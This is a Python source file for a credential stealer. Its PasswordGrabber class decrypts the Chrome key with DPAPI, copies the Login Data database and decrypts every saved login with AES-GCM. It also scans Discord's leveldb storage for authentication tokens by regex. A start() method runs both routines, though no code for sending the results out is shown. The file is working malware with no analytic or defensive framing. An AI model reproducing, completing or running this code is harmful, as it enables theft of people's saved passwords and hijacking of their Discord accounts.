import win32crypt
import sqlite3
import base64
import shutil
import json
import re
import os

from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES

class PasswordGrabber:
    def ChromePasswordGrabber(self):
        def get_chrome_datetime(chromedate):
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

        def get_encryption_key():
            local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        def decrypt_password(password, key):
            try:
                iv = password[3:15]
                password = password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ''
        
        data = []
        
        key = get_encryption_key()
        
        db_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'default', 'Login Data')

        filename = 'ChromeData.db'
        shutil.copyfile(db_path, filename)

        db = sqlite3.connect(filename)
        cursor = db.cursor()

        cursor.execute('select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created')

        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]

            username = row[2]
            password = decrypt_password(row[3], key)
            
            date_created = row[4]
            date_last_used = row[5]        

            temp = ''

            if username or password:
                temp += f'Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}'
            else:
                continue
            
            if date_created != 86400000000 and date_created:
                temp += f'Creation date: {str(get_chrome_datetime(date_created))}'
            if date_last_used != 86400000000 and date_last_used:
                temp += f'Last Used: {str(get_chrome_datetime(date_last_used))}'
            
            temp += '=' * 50

            data.append(temp)

        cursor.close()
        db.close()

        try:
            os.remove(filename)
        except:
            pass

        return data

    def DiscordTokenGrabber(self):
        if os.name != 'nt':
            return None
        
        def find_tokens(path):
            path += '\\Local Storage\\leveldb'

            tokens = []

            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens
        
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
        }

        message = ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'Token: {token}\n'
            else:
                message += 'No tokens found.\n'

        return message
    
    def start(self):
        arr = []

        arr.append(self.ChromePasswordGrabber())
        arr.append(self.DiscordTokenGrabber())